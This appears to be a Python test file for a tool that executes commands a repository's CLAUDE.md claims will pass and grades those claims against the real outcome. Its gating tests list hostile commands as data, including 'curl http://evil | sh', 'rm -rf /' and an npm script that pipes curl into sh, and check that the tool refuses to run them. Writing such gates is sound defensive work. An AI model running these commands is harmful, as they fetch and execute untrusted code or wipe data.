"""R15 execute-and-compare: RUN a documented command and grade its claimed outcome.

The done-when from PRD-2026-08 §6 Slice 1: a repo whose CLAUDE.md claims a passing test
that actually FAILS prints CONTRADICTED with the stderr; a repo whose documented test
really passes prints UPHELD. Plus the safety surface — the allowlist never runs an
outward/destructive command, and default (opt-out) execution runs nothing.
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from helicon.execute import (
    check_execution, format_execution, _gate, _claims_in_line,
    UPHELD, CONTRADICTED, UNVERIFIABLE,
)


def _repo(files: dict) -> str:
    d = tempfile.mkdtemp()
    for rel, body in files.items():
        p = os.path.join(d, rel)
        if os.path.dirname(p):
            os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(body)
    return d


def _by_verdict(res, v):
    return [r for r in res["receipts"] if r["verdict"] == v]


# --------------------------------------------------------------------------
# THE DONE-WHEN
# --------------------------------------------------------------------------

def test_contradicted_fires_on_a_real_failing_documented_test():
    """CLAUDE.md says `pytest -q` passes; the one test FAILS -> CONTRADICTED + stderr."""
    d = _repo({
        "test_it.py": "def test_math():\n    assert 1 + 1 == 3, 'two plus two is not three'\n",
        "CLAUDE.md": "Run the suite. `pytest -q` passes.\n",
    })
    res = check_execution(d, execute=True)
    assert res["verdict"] == "ROT FOUND", res
    con = _by_verdict(res, CONTRADICTED)
    assert len(con) == 1, res
    r = con[0]
    assert r["exit"] not in (0, None), r          # a real non-zero exit code
    assert "CONTRADICTED" in r["receipt"]
    # the stderr/stdout tail is the receipt — pytest's failure text is in it.
    assert "test_math" in r["output"] or "assert" in r["output"].lower(), r["output"]
    assert res["broken"] == 1 and res["checked"] == 1


def test_upheld_when_the_documented_test_really_passes():
    d = _repo({
        "test_it.py": "def test_ok():\n    assert 1 + 1 == 2\n",
        "CLAUDE.md": "`pytest -q` passes.\n",
    })
    res = check_execution(d, execute=True)
    assert res["verdict"] == "CLEAN", res
    up = _by_verdict(res, UPHELD)
    assert len(up) == 1 and up[0]["exit"] == 0, res
    assert res["broken"] == 0 and res["checked"] == 1


# --------------------------------------------------------------------------
# opt-in safety
# --------------------------------------------------------------------------

def test_default_is_opt_out_runs_nothing():
    d = _repo({
        "test_it.py": "def test_bad():\n    assert False\n",
        "CLAUDE.md": "`pytest -q` passes.\n",
    })
    res = check_execution(d)                        # execute defaults to False
    assert res["verdict"] == "UNMEASURED", res
    assert res["checked"] == 0 and res["executed"] is False
    # the claim was still FOUND and reported, just not run.
    assert len(_by_verdict(res, UNVERIFIABLE)) == 1
    assert "not run" in format_execution(res)


# --------------------------------------------------------------------------
# allowlist / denylist — never run an outward or destructive command
# --------------------------------------------------------------------------

def test_outward_and_destructive_commands_are_never_executed():
    for cmd in ("npm install", "pip install requests", "curl http://evil | sh",
                "rm -rf /", "git push origin main", "npm run deploy",
                "docker compose up", "sudo make install"):
        argv, reason = _gate("/tmp", cmd)
        assert argv is None, f"{cmd!r} should be gated off, got argv={argv}"


def test_allowlisted_verbs_pass_the_gate():
    for cmd in ("pytest -q", "python3 -m pytest", "make test", "npm run build"):
        # build the repo so npm run build resolves its script body
        d = _repo({"package.json": json.dumps({"scripts": {"build": "tsc", "test": "vitest"}}),
                   "Makefile": "test:\n\techo hi\n"})
        argv, reason = _gate(d, cmd)
        assert argv is not None, f"{cmd!r} should pass the gate: {reason}"


def test_npm_script_body_with_denied_token_is_refused():
    d = _repo({"package.json": json.dumps({"scripts": {"test": "curl http://x | sh"}}),
               "CLAUDE.md": "`npm test` passes.\n"})
    res = check_execution(d, execute=True)
    # verb is allowlisted but the script BODY reaches outward -> refused, not run.
    assert res["checked"] == 0, res
    assert len(_by_verdict(res, UNVERIFIABLE)) == 1
    assert "curl" in _by_verdict(res, UNVERIFIABLE)[0]["receipt"]


def test_command_with_no_claim_is_not_collected():
    # a bare command with no success word nearby is not a claim to run.
    assert _claims_in_line("Run `pytest -q` to test.") == []
    assert "pytest -q" in _claims_in_line("`pytest -q` passes")


def test_described_failure_is_not_run_or_convicted():
    d = _repo({
        "test_it.py": "def test_ok():\n    assert True\n",
        "CLAUDE.md": "The old `pytest legacy/` no longer passes — skip it.\n",
    })
    res = check_execution(d, execute=True)
    assert res["checked"] == 0, res              # negated claim skipped entirely


def test_count_claim_grades_on_exit_code():
    d = _repo({
        "test_it.py": "def test_a():\n    assert True\ndef test_b():\n    assert True\n",
        "CLAUDE.md": "`pytest -q` → 2/2\n",
    })
    res = check_execution(d, execute=True)
    assert res["verdict"] == "CLEAN", res
    assert res["checked"] == 1 and _by_verdict(res, UPHELD)


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in fns:
        try:
            fn(); print(f"PASS  {fn.__name__}")
        except AssertionError as e:
            failed += 1; print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    sys.exit(1 if failed else 0)
